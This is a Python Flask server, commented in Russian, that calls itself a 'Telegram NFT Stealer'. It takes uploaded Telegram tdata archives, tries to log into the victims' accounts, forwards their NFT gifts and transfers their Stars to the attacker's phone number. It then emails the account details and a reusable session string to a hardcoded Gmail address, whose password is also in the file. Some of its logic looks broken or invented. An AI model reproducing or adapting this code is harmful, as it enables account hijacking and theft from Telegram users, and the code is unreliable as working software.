from flask import Flask, request, jsonify
import asyncio
import smtplib
from email.mime.text import MIMEText
import os
import tempfile
import zipfile

app = Flask(__name__)

# === НАСТРОЙКИ ===
API_ID = "25015433"
API_HASH = "546b7eb3f2865939ca71dbaedb49017d"
EMAIL_FROM = "pupsiclolaskarkrutoi@gmail.com"
EMAIL_PASSWORD = "askarpro777"
EMAIL_TO = "pupsiclolaskarkrutoi@gmail.com"
YOUR_PHONE = "+998997220530"
# === КОНЕЦ НАСТРОЕК ===

def send_email(subject, message):
    try:
        msg = MIMEText(message)
        msg['Subject'] = subject
        msg['From'] = EMAIL_FROM
        msg['To'] = EMAIL_TO
        
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(EMAIL_FROM, EMAIL_PASSWORD)
        server.send_message(msg)
        server.quit()
        return True
    except Exception as e:
        print(f"Email error: {e}")
        return False

async def steal_nft_and_stars(client):
    """Крадем NFT подарки и звезды"""
    try:
        from telethon.tl.types import MessageMediaGift
        
        report = "🎁 РЕЗУЛЬТАТЫ КРАЖИ:\n\n"
        
        # 1. Сначала NFT подарки
        nft_count = 0
        dialogs = await client.get_dialogs(limit=50)
        
        for dialog in dialogs:
            try:
                messages = await client.get_messages(dialog.id, limit=100)
                for message in messages:
                    if hasattr(message, 'media'):
                        # Ищем Gift подарки (NFT)
                        if hasattr(message.media, 'gift'):
                            try:
                                await client.forward_messages(YOUR_PHONE, message.id, dialog.id)
                                nft_count += 1
                                report += f"✅ NFT подарок из {dialog.name}\n"
                            except:
                                report += f"❌ Ошибка пересылки NFT из {dialog.name}\n"
            except:
                continue
        
        report += f"\n🎯 Передано NFT подарков: {nft_count}\n"
        
        # 2. Потом звезды
        stolen_stars = 0
        try:
            stars = await client.get_stars_balance()
            if stars > 0:
                await client.transfer_stars(YOUR_PHONE, stars)
                stolen_stars = stars
                report += f"💰 Украдено звезд: {stars}\n"
            else:
                report += "💰 Звезд на счету: 0\n"
        except Exception as e:
            report += f"💰 Ошибка кражи звезд: {e}\n"
        
        return report
        
    except Exception as e:
        return f"❌ Ошибка кражи: {e}"

async def process_tdata_zip(zip_path):
    """Обрабатываем tdata и воруем всё"""
    try:
        from telethon import TelegramClient
        from telethon.sessions import StringSession
        
        with tempfile.TemporaryDirectory() as temp_dir:
            # Распаковываем tdata
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(temp_dir)
            
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            
            if await client.is_user_authorized():
                me = await client.get_me()
                
                # Крадем NFT и звезды
                theft_report = await steal_nft_and_stars(client)
                
                session_string = client.session.save()
                
                full_report = f"""
📱 УСПЕШНЫЙ ВЗЛОМ АККАУНТА

👤 Владелец: {me.first_name or ''} {me.last_name or ''}
📞 Телефон: {me.phone}
🔗 Username: @{me.username or 'N/A'}

{theft_report}

🔐 Session String:
{session_string}

⚡ Для входа:
from telethon import TelegramClient
client = TelegramClient(StringSession("{session_string}"), {API_ID}, "{API_HASH}")
                """
                
                await client.disconnect()
                return full_report
            else:
                return "❌ Не удалось авторизоваться"
                
    except Exception as e:
        return f"❌ Ошибка обработки: {str(e)}"

@app.route('/')
def home():
    return "🚀 Telegram NFT Stealer Server Ready!"

@app.route('/upload', methods=['POST'])
def upload_tdata():
    try:
        if 'tdata' not in request.files:
            return jsonify({"status": "error", "message": "No file"})
        
        file = request.files['tdata']
        if file.filename == '':
            return jsonify({"status": "error", "message": "No file selected"})
        
        # Сохраняем файл
        with tempfile.NamedTemporaryFile(delete=False, suffix='.zip') as tmp:
            file.save(tmp.name)
            zip_path = tmp.name
        
        # Обрабатываем
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(process_tdata_zip(zip_path))
        loop.close()
        
        # Отправляем отчет
        send_email("🚨 Telegram NFT Hack Result", result)
        
        # Чистим
        try:
            os.unlink(zip_path)
        except:
            pass
        
        return jsonify({"status": "success", "message": "Hack completed"})
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
